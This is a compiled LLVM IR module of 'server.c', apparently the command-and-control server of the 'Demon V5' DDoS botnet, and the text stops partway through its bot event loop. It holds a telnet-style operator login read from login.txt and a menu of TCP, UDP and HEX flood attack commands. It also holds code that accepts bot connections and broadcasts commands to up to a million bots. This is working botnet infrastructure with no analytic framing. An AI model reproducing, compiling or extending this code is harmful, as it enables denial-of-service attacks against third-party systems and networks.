; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct.login_info = type { [100 x i8], [100 x i8] }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[0;34m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.8 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.13 = private unnamed_addr constant [20 x i8] c"%c]0; %d Devices %c\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [100 x %struct.login_info] zeroinitializer, align 16
@.str.15 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.16 = private unnamed_addr constant [20 x i8] c"\1B[0;36mUsername ~  \00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.18 = private unnamed_addr constant [20 x i8] c"\1B[0;36mPassword ~  \00", align 1
@.str.19 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.20 = private unnamed_addr constant [4 x i8] c" \0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [78 x i8] c"\1B[1;30m          - - - - - - - - - - - - - - - - - - - - - - - - - - - \1B[0m\0D\0A\00", align 1
@.str.22 = private unnamed_addr constant [114 x i8] c"         [\1B[1;31m\E3\83\8F\E3\82\A4\E3\83\96\E3\83\AA\E3\83\83\E3\83\89\1B[0m] \1B[0;36mD E M O N  B U I L D  V 5 \1B[0m[\1B[1;31m\E3\83\8F\E3\82\A4\E3\83\96\E3\83\AA\E3\83\83\E3\83\89\1B[0m]  \0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [93 x i8] c"\1B[1;30m          - - - - - - - - -\1B[0m\1B[31m @SelfRepNeTiS \1B[1;30m- - - - - - - - - -\1B[0m  \0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [95 x i8] c"\1B[1;30m          - - - - - - - - -\1B[0m\1B[31m DDOS Responsibly\1B[1;30m- - - - - - - - - -\1B[0m  \0D\0A\00", align 1
@.str.25 = private unnamed_addr constant [96 x i8] c"\1B[1;30m          - - - - - - - - -\1B[0m\1B[31m Don't Spam  \1B[1;30m- - - - - - - - - - - -\1B[0m   \0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [95 x i8] c"\1B[1;30m          - - - - - - - - -\1B[0m\1B[31m help for help \1B[1;30m- - - - - - - - - - -\1B[0m  \0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [104 x i8] c"\1B[1;30m          - - - - - - - - - - - - - - - - - - - - - - - - - - - \1B[0m                          \0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [35 x i8] c"\1B[1;31m%s\1B[1;30m@\1B[1;31mDemon  ~  \00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"?\00", align 1
@.str.32 = private unnamed_addr constant [91 x i8] c"\1B[1;31m*** TCP ~ !* TCP IP PORT TIME 32 all 1460 10     \1B[1;37m|\1B[31m Launch A TCP Flood\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [90 x i8] c"\1B[1;31m*** UDP ~ !* UDP IP PORT TIME 32 1460 10      \09 \1B[1;37m|\1B[31m Launch A UDP Flood\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [90 x i8] c"\1B[1;31m*** HEX ~ !* HEX IP PORT TIME PSIZE           \09 \1B[1;37m|\1B[31m Launch A HEX Flood\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [85 x i8] c"\1B[1;31m*** STOP ~ !* STOP           \09            \09 \1B[1;37m|\1B[31m Stops ALL Attacks\0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.37 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.38 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@.str.40 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.41 = private unnamed_addr constant [9 x i8] c"user.log\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.44 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.45 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.46 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.47 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.48 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.49 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.50 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"ZERO\00", align 1
@.str.52 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.53 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.54 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.55 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %78, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %81

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %49, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 1
  %47 = load i8, i8* %46, align 4
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %50, label %49

49:                                               ; preds = %42, %38
  br label %78

50:                                               ; preds = %42
  %51 = load i32, i32* %7, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %70

53:                                               ; preds = %50
  %54 = load i32, i32* %12, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %55
  %57 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %56, i32 0, i32 0
  %58 = load i32, i32* %57, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %70

60:                                               ; preds = %53
  %61 = load i32, i32* %12, align 4
  %62 = call i64 @send(i32 %61, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 9, i32 16384)
  %63 = load i32, i32* %12, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #8
  %67 = call i64 @send(i32 %63, i8* %64, i64 %66, i32 16384)
  %68 = load i32, i32* %12, align 4
  %69 = call i64 @send(i32 %68, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %70

70:                                               ; preds = %60, %53, %50
  %71 = load i32, i32* %12, align 4
  %72 = load i8*, i8** %4, align 8
  %73 = load i8*, i8** %4, align 8
  %74 = call i64 @strlen(i8* %73) #8
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = load i32, i32* %12, align 4
  %77 = call i64 @send(i32 %76, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0), i64 1, i32 16384)
  br label %78

78:                                               ; preds = %70, %49
  %79 = load i32, i32* %12, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %12, align 4
  br label %35, !llvm.loop !11

81:                                               ; preds = %35
  %82 = load i8*, i8** %8, align 8
  call void @free(i8* %82) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %20 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %21 = bitcast i8* %20 to %struct.epoll_event*
  store %struct.epoll_event* %21, %struct.epoll_event** %4, align 8
  br label %22

22:                                               ; preds = %1, %265
  %23 = load volatile i32, i32* @epollFD, align 4
  %24 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %25 = call i32 @epoll_wait(i32 %23, %struct.epoll_event* %24, i32 1000000, i32 -1)
  store i32 %25, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %26

26:                                               ; preds = %262, %22
  %27 = load i32, i32* %7, align 4
  %28 = load i32, i32* %6, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %265

30:                                               ; preds = %26
  %31 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %32 = load i32, i32* %7, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %31, i64 %33
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %34, i32 0, i32 0
  %36 = load i32, i32* %35, align 1
  %37 = and i32 %36, 8
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %57, label %39

39:                                               ; preds = %30
  %40 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %40, i64 %42
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %43, i32 0, i32 0
  %45 = load i32, i32* %44, align 1
  %46 = and i32 %45, 16
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %57, label %48

48:                                               ; preds = %39
  %49 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %50 = load i32, i32* %7, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %49, i64 %51
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %52, i32 0, i32 0
  %54 = load i32, i32* %53, align 1
  %55 = and i32 %54, 1
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %76, label %57

57:                                               ; preds = %48, %39, %30
  %58 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %59 = load i32, i32* %7, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %58, i64 %60
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %61, i32 0, i32 1
  %63 = bitcast %union.epoll_data* %62 to i32*
  %64 = load i32, i32* %63, align 1
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %65
  %67 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %66, i32 0, i32 1
  store i8 0, i8* %67, align 4
  %68 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %69 = load i32, i32* %7, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %68, i64 %70
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %71, i32 0, i32 1
  %73 = bitcast %union.epoll_data* %72 to i32*
  %74 = load i32, i32* %73, align 1
  %75 = call i32 @close(i32 %74)
  br label %262

76:                                               ; preds = %48
  %77 = load volatile i32, i32* @listenFD, align 4
  %78 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %79 = load i32, i32* %7, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %78, i64 %80
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %81, i32 0, i32 1
  %83 = bitcast %union.epoll_data* %82 to i32*
  %84 = load i32, i32* %83, align 1
  %85 = icmp eq i32 %77, %84
  br i1 %85, label %86, label %170

86:                                               ; preds = %76
  br label %87

87:                                               ; preds = %86, %164
  store i32 16, i32* %9, align 4
  %88 = load volatile i32, i32* @listenFD, align 4
  %89 = call i32 @accept(i32 %88, %struct.sockaddr* %8, i32* %9)
  store i32 %89, i32* %10, align 4
  %90 = load i32, i32* %10, align 4
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %102

92:                                               ; preds = %87
  %93 = call i32* @__errno_location() #10
  %94 = load i32, i32* %93, align 4
  %95 = icmp eq i32 %94, 11
  br i1 %95, label %100, label %96

96:                                               ; preds = %92
  %97 = call i32* @__errno_location() #10
  %98 = load i32, i32* %97, align 4
  %99 = icmp eq i32 %98, 11
  br i1 %99, label %100, label %101

100:                                              ; preds = %96, %92
  br label %169

101:                                              ; preds = %96
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %169

102:                                              ; preds = %87
  %103 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %103, i32 0, i32 2
  %105 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 2
  %107 = load i32, i32* %10, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %108
  %110 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %109, i32 0, i32 0
  store i32 %106, i32* %110, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %111

111:                                              ; preds = %140, %102
  %112 = load i32, i32* %11, align 4
  %113 = icmp slt i32 %112, 1000000
  br i1 %113, label %114, label %143

114:                                              ; preds = %111
  %115 = load i32, i32* %11, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %116
  %118 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %117, i32 0, i32 1
  %119 = load i8, i8* %118, align 4
  %120 = icmp ne i8 %119, 0
  br i1 %120, label %121, label %125

121:                                              ; preds = %114
  %122 = load i32, i32* %11, align 4
  %123 = load i32, i32* %10, align 4
  %124 = icmp eq i32 %122, %123
  br i1 %124, label %125, label %126

125:                                              ; preds = %121, %114
  br label %140

126:                                              ; preds = %121
  %127 = load i32, i32* %11, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %128
  %130 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %129, i32 0, i32 0
  %131 = load i32, i32* %130, align 8
  %132 = load i32, i32* %10, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %133
  %135 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %134, i32 0, i32 0
  %136 = load i32, i32* %135, align 8
  %137 = icmp eq i32 %131, %136
  br i1 %137, label %138, label %139

138:                                              ; preds = %126
  store i32 1, i32* %12, align 4
  br label %143

139:                                              ; preds = %126
  br label %140

140:                                              ; preds = %139, %125
  %141 = load i32, i32* %11, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %11, align 4
  br label %111, !llvm.loop !12

143:                                              ; preds = %138, %111
  %144 = load i32, i32* %10, align 4
  %145 = call i32 @make_socket_non_blocking(i32 %144)
  store i32 %145, i32* %5, align 4
  %146 = load i32, i32* %5, align 4
  %147 = icmp eq i32 %146, -1
  br i1 %147, label %148, label %151

148:                                              ; preds = %143
  %149 = load i32, i32* %10, align 4
  %150 = call i32 @close(i32 %149)
  br label %169

151:                                              ; preds = %143
  %152 = load i32, i32* %10, align 4
  %153 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %154 = bitcast %union.epoll_data* %153 to i32*
  store i32 %152, i32* %154, align 1
  %155 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %155, align 1
  %156 = load volatile i32, i32* @epollFD, align 4
  %157 = load i32, i32* %10, align 4
  %158 = call i32 @epoll_ctl(i32 %156, i32 1, i32 %157, %struct.epoll_event* %3) #9
  store i32 %158, i32* %5, align 4
  %159 = load i32, i32* %5, align 4
  %160 = icmp eq i32 %159, -1
  br i1 %160, label %161, label %164

161:                                              ; preds = %151
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %162 = load i32, i32* %10, align 4
  %163 = call i32 @close(i32 %162)
  br label %169

164:                                              ; preds = %151
  %165 = load i32, i32* %10, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %166
  %168 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %167, i32 0, i32 1
  store i8 1, i8* %168, align 4
  br label %87

169:                                              ; preds = %161, %148, %101, %100
  br label %262

170:                                              ; preds = %76
  %171 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %172 = load i32, i32* %7, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %171, i64 %173
  %175 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %174, i32 0, i32 1
  %176 = bitcast %union.epoll_data* %175 to i32*
  %177 = load i32, i32* %176, align 1
  store i32 %177, i32* %13, align 4
  %178 = load i32, i32* %13, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %179
  store %struct.clientdata_t* %180, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %181 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %182 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %181, i32 0, i32 1
  store i8 1, i8* %182, align 4
  br label %183

183:                                              ; preds = %170, %258
  %184 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %184, i8 0, i64 2048, i1 false)
  br label %185

185:                                              ; preds = %233, %232, %225, %217, %211, %183
  %186 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %186, i8 0, i64 2048, i1 false)
  %187 = icmp ne i8* %186, null
  br i1 %187, label %188, label %194

188:                                              ; preds = %185
  %189 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %190 = load i32, i32* %13, align 4
  %191 = call i32 @fdgets(i8* %189, i32 2048, i32 %190)
